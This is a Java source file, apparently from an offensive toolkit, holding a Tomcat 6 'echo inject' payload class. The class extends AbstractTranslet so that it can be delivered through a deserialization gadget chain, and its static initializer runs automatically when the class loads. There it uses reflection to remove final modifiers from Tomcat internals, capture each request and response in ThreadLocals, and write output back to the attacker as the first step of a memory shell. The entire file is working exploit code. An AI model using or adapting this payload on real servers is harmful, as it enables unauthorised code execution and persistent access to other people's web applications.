package gadget.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

import static util.ReflectionUtils.getFuckField;

/**
 * @author squirt1e
 * @support version tomcat 6
 */
public class Tomcat6EchoInject extends AbstractTranslet {
    static {
        try {
            Field wrap_same_object =null;
            wrap_same_object = Class.forName("org.apache.catalina.Globals").getDeclaredField("STRICT_SERVLET_COMPLIANCE");
            Field lastServicedRequest = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedRequest");
            Field lastServicedResponse = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedResponse");
            lastServicedRequest.setAccessible(true);
            lastServicedResponse.setAccessible(true);
            wrap_same_object.setAccessible(true);


            //修改final属性
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(wrap_same_object, wrap_same_object.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~Modifier.FINAL);
            boolean wrap_same_object1 = wrap_same_object.getBoolean(null);
            ThreadLocal<ServletRequest> requestThreadLocal = (ThreadLocal<ServletRequest>)lastServicedRequest.get(null);
            ThreadLocal<ServletResponse> responseThreadLocal = (ThreadLocal<ServletResponse>)lastServicedResponse.get(null);
            if (!wrap_same_object1 && requestThreadLocal == null && responseThreadLocal == null){ //第一次请求时反射注册request和response到threadLocal中
                wrap_same_object.setBoolean(null,true);
                lastServicedRequest.set(null,new ThreadLocal());
                lastServicedResponse.set(null,new ThreadLocal());
            }else{   //从threadLocal中取出response证明
                ServletResponse servletResponse = responseThreadLocal.get();
                servletResponse.getWriter().write("ok");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
